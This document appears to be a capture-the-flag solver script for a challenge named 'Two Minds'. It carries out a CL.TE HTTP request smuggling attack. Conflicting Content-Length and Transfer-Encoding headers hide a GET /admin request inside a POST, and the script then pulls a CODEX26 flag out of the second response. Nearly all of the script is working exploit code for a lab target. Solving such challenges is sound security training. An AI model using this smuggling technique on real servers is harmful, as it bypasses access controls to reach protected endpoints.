#!/usr/bin/env python3
"""Two Minds solver — CL.TE HTTP request smuggling."""
import re
import socket
import sys

HOST = sys.argv[1] if len(sys.argv) > 1 else '127.0.0.1'
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 11025


def read_response(sock):
    buf = b''
    while b'\r\n\r\n' not in buf:
        d = sock.recv(4096)
        if not d:
            return b''
        buf += d
    head, rest = buf.split(b'\r\n\r\n', 1)
    cl = 0
    for l in head.decode('latin1').split('\r\n')[1:]:
        if l.lower().startswith('content-length:'):
            cl = int(l.split(':', 1)[1].strip())
    while len(rest) < cl:
        d = sock.recv(4096)
        if not d:
            break
        rest += d
    return head + b'\r\n\r\n' + rest[:cl]


def main():
    s = socket.create_connection((HOST, PORT), timeout=10)
    smuggled = b"0\r\n\r\nGET /admin HTTP/1.1\r\nHost: two-minds\r\n\r\n"
    req = (b"POST / HTTP/1.1\r\n"
           b"Host: two-minds\r\n"
           b"Content-Length: " + str(len(smuggled)).encode() + b"\r\n"
           b"Transfer-Encoding: chunked\r\n\r\n" + smuggled)
    s.sendall(req)
    r1 = read_response(s)
    print('response 1:', r1.split(b'\r\n', 1)[0].decode(errors='replace'))
    s.sendall(b"GET / HTTP/1.1\r\nHost: two-minds\r\n\r\n")
    r2 = read_response(s)
    m = re.search(rb'CODEX26\{[^}]+\}', r2)
    if m:
        print('FLAG:', m.group(0).decode())
    else:
        print('raw response 2:')
        print(r2.decode(errors='replace')[:600])
    s.close()


if __name__ == '__main__':
    main()
